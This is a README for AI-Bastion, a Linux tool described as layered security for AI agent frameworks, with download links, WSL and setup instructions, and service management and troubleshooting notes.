# 🔐 AI-Bastion - Secure Your AI Agents on Linux

[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-ff4500?style=for-the-badge)](https://github.com/JohnField07/AI-Bastion/releases)

## 🔍 About AI-Bastion

AI-Bastion offers an 8-layer security plan designed for AI agents running on Linux systems. It provides defense-in-depth protection for popular autonomous AI platforms like OpenClaw, LangChain, CrewAI, and AutoGPT. The software helps protect your AI agents from attacks by applying multiple security layers, including network controls and token monitoring.

This project is aimed at users who run AI software that needs added protection against security threats. While focused on Linux environments, it guides you on securing these agents comprehensively.

## 📋 System Requirements

Before installing AI-Bastion, make sure your system meets the following:

- **Operating System:** Linux (Ubuntu 20.04 or later recommended)  
- **CPU:** 64-bit processor  
- **Memory:** At least 4 GB of RAM  
- **Disk Space:** Minimum 500 MB free  
- **Network:** Internet access needed for initial setup and updates  
- **Privileges:** Root or sudo access on your Linux machine

For Windows users, AI-Bastion itself runs on Linux but you can use the Windows Subsystem for Linux (WSL) to set it up. Instructions for WSL appear later.

## 🛠️ Features

AI-Bastion provides several security controls to protect your AI agents:

- Multi-layered network filtering using nftables  
- Canary token integration for early threat detection  
- Role-based access control for agent management  
- Automated monitoring of suspicious activity  
- Log reviews aligned with OWASP guidelines  
- Integration with Security Orchestration, Automation, and Response (SOAR) platforms  
- Support for custom rules to fit your environment  
- Comprehensive audit tools to keep your system secure

These features work together to create a strong security perimeter around your AI agents.

## 🚀 Getting Started

This section guides you in downloading and setting up AI-Bastion on your Linux system or within WSL on Windows.

### Step 1: Visit the Download Page

Click the button below to open the AI-Bastion release page. You will find the latest versions available here.

[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-orange?style=for-the-badge)](https://github.com/JohnField07/AI-Bastion/releases)

### Step 2: Choose the Correct Package

On the releases page:

- Look for the latest stable release.  
- Download the `.tar.gz` or `.zip` file suitable for Linux.  
- For Windows using WSL, use the Linux package inside the subsystem.

### Step 3: Install Windows Subsystem for Linux (WSL) (Windows Only)

If you want to run AI-Bastion from Windows, follow these.

1. Open PowerShell as Administrator.  
2. Run:  
   `wsl --install`  
3. Restart your computer when prompted.  
4. Set up Ubuntu 20.04 or later when WSL prompts you after restart.  
5. Update packages inside WSL by running:  
   ```
   sudo apt update && sudo apt upgrade -y
   ```

This prepares your system to run Linux software on Windows.

### Step 4: Extract AI-Bastion Files

On Linux or WSL:

1. Move to your downloads folder.  
2. Extract the downloaded archive:  
   - For `.tar.gz` use:  
     `tar -xvzf AI-Bastion-VERSION.tar.gz`  
   - For `.zip` use:  
     `unzip AI-Bastion-VERSION.zip`  

Replace `VERSION` with the actual version number downloaded.

### Step 5: Run the Setup Script

Navigate inside the extracted AI-Bastion directory:

```
cd AI-Bastion-VERSION
```

Launch the setup script:

```
sudo ./setup.sh
```

This script configures network filters, installs dependencies, and sets your AI agents’ security settings.

### Step 6: Confirm Installation

After setup completes, check the status by running:

```
sudo systemctl status ai-bastion.service
```

You should see the service active and running. If not, review any messages or logs for errors.

## ⚙️ How AI-Bastion Works

AI-Bastion deploys eight layers of security that protect your AI agents from multiple angles. Each layer focuses on a specific threat or protection method.

1. **Network Controls:**  
   Use nftables firewall rules to block unwanted traffic.  

2. **Agent Access Rules:**  
   Limit which users and services can interact with AI agents.  

3. **Token Monitoring:**  
   Deploy canary tokens to track unauthorized access attempts.  

4. **Logging and Alerting:**  
   Collect logs continuously and raise alerts on suspicious events.  

5. **Threat Intelligence Integration:**  
   Use latest data feeds to update your defense automatically.  

6. **Response Automation:**  
   Trigger predefined actions if a threat is detected.  

7. **Audit Trails:**  
   Maintain records for all agent interactions for compliance.  

8. **Configuration Hardening:**  
   Apply secure defaults based on the latest OWASP guidance.

This layered approach helps contain threats before they cause harm.

## 🔧 Managing AI-Bastion

### Starting and Stopping the Service

Use systemd commands:

- Start:  
  `sudo systemctl start ai-bastion.service`

- Stop:  
  `sudo systemctl stop ai-bastion.service`

- Restart:  
  `sudo systemctl restart ai-bastion.service`

### Updating AI-Bastion

1. Visit the [Releases Page](https://github.com/JohnField07/AI-Bastion/releases).  
2. Download the latest version.  
3. Repeat installation steps from extraction to setup.

### Viewing Logs

Log files are stored in:

```
/var/log/ai-bastion/
```

Use `tail` or `less` to inspect logs, for example:

```
sudo tail -f /var/log/ai-bastion/agent.log
```

## ⚙️ Using AI-Bastion with Your AI Agents

AI-Bastion works with these AI frameworks:

- OpenClaw  
- LangChain  
- CrewAI  
- AutoGPT  

To connect, configure your AI agent's network settings to route through AI-Bastion’s monitoring service or apply the nftables rules recommended in the setup.  

For detailed integration, consult the configuration guides inside the `docs` folder once installed.

## ❓ Troubleshooting

- **Service Fails to Start:**  
  Check for missing dependencies or incorrect permissions. Run setup again if needed.  

- **Network Blocks Legitimate Traffic:**  
  Review nftables rules and whitelist trusted IPs manually.  

- **Canary Tokens Trigger Constant Alerts:**  
  Verify if tokens are placed correctly and that alerts are tuned for your environment.  

- **Cannot Access Service Logs:**  
  Confirm you have sudo privileges and the log files exist in `/var/log/ai-bastion/`.

## 🛡️ Security Notes

- Run setup scripts with root or sudo.  
- Keep your Linux system updated.  
- Change default passwords of your AI agents.  
- Regularly check logs for unusual activity.  
- Do not expose AI services directly to the internet without AI-Bastion protection.

## 🔗 Useful Links

- Main Releases Page: https://github.com/JohnField07/AI-Bastion/releases  
- AI-Bastion Documentation (Installed under `/usr/share/ai-bastion/docs`)  
- Linux nftables Documentation: https://wiki.nftables.org/

[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-ff4500?style=for-the-badge)](https://github.com/JohnField07/AI-Bastion/releases)